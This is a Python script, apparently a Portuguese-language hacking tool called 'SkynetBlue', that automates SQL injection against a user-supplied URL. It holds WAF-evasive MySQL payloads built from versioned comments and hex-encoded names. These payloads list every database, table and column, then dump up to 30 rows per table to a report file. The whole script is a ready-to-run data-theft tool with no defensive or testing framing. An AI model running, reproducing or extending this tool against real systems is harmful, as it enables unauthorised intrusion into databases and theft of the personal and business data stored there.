import os, re, json, threading, requests, sys
from colorama import init, Fore, Back, Style
from termcolor import colored
init(convert=True)   # Windows fix

class SkynetBlue:
    def __init__(self):
        self.banner = colored("""
  ▄████▄      ██░ ██    ▄▄▄          ███▄    █   █████▄        ▄▄▄       ████▒   
▒██▀   ▀█    ▓██░ ██▒▒  ████▄        ██  ██  █▒ ██    ▒█     ██   ▀█    ▓█   █
▒▓█      ▄   ▒██▀▀██░▒  ██   ▀█▄    ▓██   ▀█ █▒░██     █▌  ░▄█    ██    ▒▀█▄██▒
▒▓▓▄   ▄██▒░  ▓█ ░██   ░██▄▄▄▄██    ▓██▒   ▐▌█▒░▓█    ██  ░██▄▄▄▄██   
▒   ▓███▀   ░░▓█▒░██▓   ▓█     ▓██ ▒▒██░    ▓█░░▒████▓   ░██▓   ▒██▒   
░   ░▒   ▒    ░   ▒   ░░▒░▒   ▒▒       ▒░     ▒   ▒    ▒▒▓    ▒   ░      
    ░    ▒      ▒   ░▒░   ░    ▒     ▒▒   ░░   ░░     ░   ▒░   ░   ▒   
░           ░    ░░   ░    ░     ▒        ░     ░   ░    ░   ░    ░    
░   ░         ░    ░    ░        ░    ░           ░      ░         ░             
░                                           ░
""", "cyan")

        # Payloads azuis
        self.payloads = {
            "dblist":  "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/(schema_name SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/information_schema.schemata",
            "tbllist": "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/(table_name SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/information_schema.tables WHERE table_schema=0x{}",
            "collist": "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/(column_name SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/information_schema.columns WHERE table_schema=0x{} AND table_name=0x{}",
            "dump":    "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/({cols} SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/`{db}`.`{tbl}`"
        }

    def splash(self):
        os.system("cls")
        print(self.banner)
        print(colored("  ► MENU AZUL – cole a URL com asterisco (*) e ENTER", "cyan", attrs=["bold"]))

    def input_url(self):
        return input(colored("\nURL com injeção (ex: http://alvo.com/prod.php?id=*)\n> ", "cyan"))

    def send(self, url, payload):
        inj = url.replace("*", payload)
        try:
            return requests.get(inj, timeout=8).text
        except:
            return ""

    def extract(self, html):
        m = re.search(r'~(.*?)~', html)
        return m.group(1).split("||") if m else []

    def run(self):
        self.splash()
        url = self.input_url()
        if "*" not in url:
            print(colored("  ❌ Falta o asterisco (*) no parâmetro!", "red"))
            return
        print(colored("\n  ► Enumerando bancos...", "cyan"))
        dbs = self.extract(self.send(url, self.payloads["dblist"]))
        if not dbs:
            print(colored("  ❌ Nenhum banco encontrado ou WAF ativo.", "red"))
            return
        print(colored("  ✔ Bancos:", "green"))
        for d in dbs:
            print(colored("   • " + d, "white", "on_blue"))

        report = {}
        for db in dbs:
            print(colored(f"\n  ► Tabelas em {db}", "cyan"))
            tbls = self.extract(self.send(url, self.payloads["tbllist"].format(db.encode().hex())))
            report[db] = {}
            for tbl in tbls:
                print(colored(f"   • {tbl}", "white", "on_blue"))
                cols = self.extract(self.send(url, self.payloads["collist"].format(db.encode().hex(), tbl.encode().hex())))
                report[db][tbl] = {"columns": cols}
                for col in cols:
                    print(colored(f"     - {col}", "blue"))
                # Dump de até 30 linhas
                cols_concat = "0x7c," + ",0x7c,".join([f"`{c}`" for c in cols]) + ",0x7c"
                rows = self.extract(self.send(url, self.payloads["dump"].format(cols=cols_concat, db=db, tbl=tbl)))
                report[db][tbl]["data"] = [r.split("|") for r in rows[:30]]
                for r in rows[:3]:
                    print(colored(f"       {r}", "cyan"))

        with open("skynet_report.txt", "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
        print(colored("\n  ✔ Relatório salvo em skynet_report.txt", "green"))
        input(colored("  ► Pressione ENTER para sair...", "cyan"))

if __name__ == "__main__":
    try:
        SkynetBlue().run()
    except KeyboardInterrupt:
        print(colored("\n [!] Interrompido pelo usuário", "red"))